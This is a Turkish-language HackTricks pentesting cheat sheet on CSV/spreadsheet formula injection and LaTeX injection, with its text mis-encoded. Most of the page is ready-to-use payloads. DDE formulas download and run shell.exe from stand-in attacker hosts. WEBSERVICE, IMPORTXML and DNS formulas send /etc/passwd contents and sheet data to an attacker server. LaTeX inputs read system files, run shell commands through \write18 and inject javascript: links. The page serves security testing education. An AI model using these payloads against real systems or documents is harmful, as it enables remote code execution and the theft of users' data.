# FormÃ¼l Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni (https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

**Try Hard GÃ¼venlik Grubu**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## FormÃ¼l Enjeksiyonu

### Bilgi

EÄŸer **girdiniz** **CSV dosyalarÄ±** iÃ§inde **yansÄ±tÄ±lÄ±yorsa** (veya muhtemelen **Excel** tarafÄ±ndan aÃ§Ä±lacak baÅŸka bir dosya iÃ§inde), Excel **formÃ¼lleri** ekleyebilirsiniz ki bu formÃ¼ller dosyayÄ± **aÃ§an kullanÄ±cÄ±** dosyayÄ± aÃ§tÄ±ÄŸÄ±nda veya Excel tablosu iÃ§indeki **bir baÄŸlantÄ±ya tÄ±kladÄ±ÄŸÄ±nda** **Ã§alÄ±ÅŸtÄ±rÄ±labilir** olabilir.

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde **Excel**, kullanÄ±cÄ±nÄ±n **kÃ¶tÃ¼ niyetli eylemlerden kaÃ§Ä±nmasÄ±** iÃ§in, Excel dÄ±ÅŸÄ±ndan bir ÅŸey yÃ¼klendiÄŸinde kullanÄ±cÄ±ya (birkaÃ§ kez) **uyarÄ±da bulunacaktÄ±r**. Bu nedenle, son yÃ¼kte **Sosyal MÃ¼hendislik** iÃ§in Ã¶zel Ã§aba gÃ¶sterilmelidir.
{% endhint %}

### [Kelime Listesi](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**AÅŸaÄŸÄ±daki Ã¶rnek, nihai excel tablosundan iÃ§erik sÄ±zdÄ±rmak ve istenmeyen konumlara istekler yapmak iÃ§in Ã§ok yararlÄ±dÄ±r. Ancak, kullanÄ±cÄ±nÄ±n baÄŸlantÄ±ya tÄ±klamasÄ± ve uyarÄ±larÄ± kabul etmesi gerekmektedir.**

AÅŸaÄŸÄ±daki Ã¶rnek [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) adresinden alÄ±nmÄ±ÅŸtÄ±r.

Bir Ã–ÄŸrenci KayÄ±t YÃ¶netim sistemindeki bir gÃ¼venlik aÃ§Ä±ÄŸÄ±, bir CSV enjeksiyon saldÄ±rÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla sÃ¶mÃ¼rÃ¼lmÃ¼ÅŸtÃ¼r. SaldÄ±rganÄ±n temel amacÄ±, Ã¶ÄŸretmenlerin Ã¶ÄŸrenci detaylarÄ±nÄ± yÃ¶netmek iÃ§in kullandÄ±ÄŸÄ± sistemi tehlikeye atmaktÄ±r. YÃ¶ntem, saldÄ±rganÄ±n kÃ¶tÃ¼ niyetli bir yÃ¼kÃ¼ uygulamaya enjekte etmesini iÃ§erir, Ã¶zellikle Ã¶ÄŸrenci detaylarÄ± iÃ§in ayrÄ±lmÄ±ÅŸ alanlara zararlÄ± formÃ¼ller girmek suretiyle. SaldÄ±rÄ± ÅŸu ÅŸekilde gerÃ§ekleÅŸir:

1. **KÃ¶tÃ¼ Niyetli YÃ¼kÃ¼n Enjeksiyonu:**
* SaldÄ±rgan bir Ã¶ÄŸrenci detay formu gÃ¶nderir ancak bir elektronik tablolarda yaygÄ±n olarak kullanÄ±lan bir formÃ¼lÃ¼ iÃ§erir (Ã¶rneÄŸin, `=HYPERLINK("<kÃ¶tÃ¼_link>","Buraya tÄ±klayÄ±n")`).
* Bu formÃ¼l, bir baÄŸlantÄ± oluÅŸturmak iÃ§in tasarlanmÄ±ÅŸtÄ±r, ancak saldÄ±rgan tarafÄ±ndan kontrol edilen kÃ¶tÃ¼ niyetli bir sunucuya iÅŸaret eder.
2. **Tehdit Edilen Verilerin DÄ±ÅŸa AktarÄ±lmasÄ±:**
* Kompromisin farkÄ±nda olmayan Ã¶ÄŸretmenler, verileri bir CSV dosyasÄ±na dÄ±ÅŸa aktarmak iÃ§in uygulamanÄ±n iÅŸlevselliÄŸini kullanÄ±r.
* AÃ§Ä±ldÄ±ÄŸÄ±nda CSV dosyasÄ± hala kÃ¶tÃ¼ niyetli yÃ¼kÃ¼ iÃ§erir. Bu yÃ¼k, elektronik tabloda tÄ±klanabilir bir baÄŸlantÄ± olarak gÃ¶rÃ¼nÃ¼r.
3. **SaldÄ±rÄ±nÄ±n Tetiklenmesi:**
* Bir Ã¶ÄŸretmen, baÄŸlantÄ±ya tÄ±klayarak, bunun Ã¶ÄŸrenci detaylarÄ±nÄ±n meÅŸru bir parÃ§asÄ± olduÄŸuna inanÄ±r.
* TÄ±kladÄ±ÄŸÄ±nda, hassas veriler (potansiyel olarak elektronik tablodan veya Ã¶ÄŸretmenin bilgisayarÄ±ndan detaylar iÃ§erebilir) saldÄ±rganÄ±n sunucusuna iletilir.
4. **Verilerin Kaydedilmesi:**
* SaldÄ±rganÄ±n sunucusu, Ã¶ÄŸretmenin bilgisayarÄ±ndan gÃ¶nderilen hassas verileri alÄ±r ve kaydeder.
* SaldÄ±rgan daha sonra bu verileri Ã§eÅŸitli kÃ¶tÃ¼ niyetli amaÃ§lar iÃ§in kullanabilir, Ã¶ÄŸrencilerin ve kurumun gizliliÄŸini ve gÃ¼venliÄŸini daha da tehlikeye atarak.

### RCE

**Daha fazla ayrÄ±ntÄ± iÃ§in** [**orijinal yazÄ±ya**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **bakÄ±n.**

Belirli yapÄ±landÄ±rmalarda veya eski Excel sÃ¼rÃ¼mlerinde, Dinamik Veri DeÄŸiÅŸimi (DDE) adÄ± verilen bir Ã¶zellik, keyfi komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi iÃ§in sÃ¶mÃ¼rÃ¼lebilir. Bunun iÃ§in aÅŸaÄŸÄ±daki ayarlarÄ±n etkinleÅŸtirilmiÅŸ olmasÄ± gerekir:

* Dosya â†’ SeÃ§enekler â†’ GÃ¼ven Merkezi â†’ GÃ¼ven Merkezi AyarlarÄ± â†’ Harici Ä°Ã§erik'e gidin ve **Dinamik Veri DeÄŸiÅŸimi Sunucusu BaÅŸlatma**'yÄ± etkinleÅŸtirin.

KÃ¶tÃ¼ niyetli yÃ¼kÃ¼ iÃ§eren bir elektronik tablo aÃ§Ä±ldÄ±ÄŸÄ±nda (ve kullanÄ±cÄ± uyarÄ±larÄ± kabul ederse), yÃ¼k yÃ¼rÃ¼tÃ¼lÃ¼r. Ã–rneÄŸin, hesap makinesi uygulamasÄ±nÄ± baÅŸlatmak iÃ§in yÃ¼k ÅŸu ÅŸekilde olacaktÄ±r:
```markdown
`=cmd|' /C calc'!xxx`
```
Ek komutlar da yÃ¼rÃ¼tÃ¼lebilir, Ã¶rneÄŸin PowerShell kullanarak bir dosyanÄ±n indirilip yÃ¼rÃ¼tÃ¼lmesi:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calc'ta Yerel Dosya Dahil Etme (LFI)

LibreOffice Calc, yerel dosyalarÄ± okumak ve veri dÄ±ÅŸa aktarmak iÃ§in kullanÄ±labilir. Ä°ÅŸte bazÄ± yÃ¶ntemler:

* Yerel `/etc/passwd` dosyasÄ±ndan ilk satÄ±rÄ± okuma: `='file:///etc/passwd'#$passwd.A1`
* Okunan verileri saldÄ±rganÄ±n kontrolÃ¼ndeki sunucuya dÄ±ÅŸa aktarma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Birden fazla satÄ±rÄ± dÄ±ÅŸa aktarma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS dÄ±ÅŸa aktarma (okunan verileri saldÄ±rganÄ±n kontrolÃ¼ndeki DNS sunucusuna DNS sorgularÄ± olarak gÃ¶nderme): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<saldÄ±rgan domain>"))`

### Out-of-Band (OOB) Veri DÄ±ÅŸa Aktarma iÃ§in Google Sheets

Google Sheets, OOB veri dÄ±ÅŸa aktarma iÃ§in sÃ¶mÃ¼rÃ¼lebilecek fonksiyonlar sunar:

* **CONCATENATE**: Dizeleri birleÅŸtirir - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: YapÄ±landÄ±rÄ±lmÄ±ÅŸ veri tÃ¼rlerinden veri alÄ±r - `=IMPORTXML(CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: RSS veya ATOM beslemelerini iÃ§e aktarÄ±r - `=IMPORTFEED(CONCAT("http://<saldÄ±rgan IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: HTML tablolarÄ±ndan veya listelerinden veri alÄ±r - `=IMPORTHTML (CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: BaÅŸka bir elektronik tablodan hÃ¼cre aralÄ±ÄŸÄ±nÄ± iÃ§e aktarÄ±r - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: Bir hÃ¼creye bir resim ekler - `=IMAGE("https://<saldÄ±rgan IP:Port>/images/srpr/logo3w.png")`

## LaTeX Enjeksiyonu

Genellikle **LaTeX kodunu PDF'ye dÃ¶nÃ¼ÅŸtÃ¼ren internet sunucularÄ±** genellikle **`pdflatex`** kullanÄ±r.\
Bu program, komut yÃ¼rÃ¼tmesini (devre dÄ±ÅŸÄ± bÄ±rakma) / izin verme iÃ§in 3 ana Ã¶zelliÄŸi kullanÄ±r:

* **`--no-shell-escape`**: `\write18{komut}` yapÄ±sÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r, hatta texmf.cnf dosyasÄ±nda etkinleÅŸtirilmiÅŸ olsa bile.
* **`--shell-restricted`**: `--shell-escape` ile aynÄ±dÄ±r, ancak Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir 'gÃ¼venli' set komutlarla **sÄ±nÄ±rlÄ±dÄ±r** (\*\*Ubuntu 16.04'te liste `/usr/share/texmf/web2c/texmf.cnf` iÃ§indedir).
* **`--shell-escape`**: `\write18{komut}` yapÄ±sÄ±nÄ± etkinleÅŸtirir. Komut herhangi bir kabuk komutu olabilir. Bu yapÄ± genellikle gÃ¼venlik nedenleriyle yasaklanmÄ±ÅŸtÄ±r.

Ancak, komutlarÄ± yÃ¼rÃ¼tmek iÃ§in baÅŸka yollar da vardÄ±r, bu nedenle Uzak Kod YÃ¼rÃ¼tme'yi Ã¶nlemek iÃ§in `--shell-restricted` kullanmak Ã§ok Ã¶nemlidir.

### Dosya Okuma <a href="#read-file" id="read-file"></a>

Enjeksiyonu \[ veya $ gibi sarmalayÄ±cÄ±larla ayarlamak gerekebilir.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Tek satÄ±rlÄ± dosya okuma
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Birden fazla satÄ±rlÄ± dosya okuma
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Dosya yaz<a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Komut yÃ¼rÃ¼tme <a href="#command-execution" id="command-execution"></a>

Komutun girdisi stdin'e yÃ¶nlendirilecek, bunu almak iÃ§in geÃ§ici bir dosya kullanÄ±n.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
EÄŸer herhangi bir LaTex hatasÄ± alÄ±rsanÄ±z, sonucu kÃ¶tÃ¼ karakterler olmadan elde etmek iÃ§in base64 kullanmayÄ± dÃ¼ÅŸÃ¼nebilirsiniz.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) tarafÄ±ndan.
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Enjeksiyonu

**Kontrol Edin** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Referanslar

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerimizden oluÅŸan**](https://opensea.io/collection/the-peass-family) [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
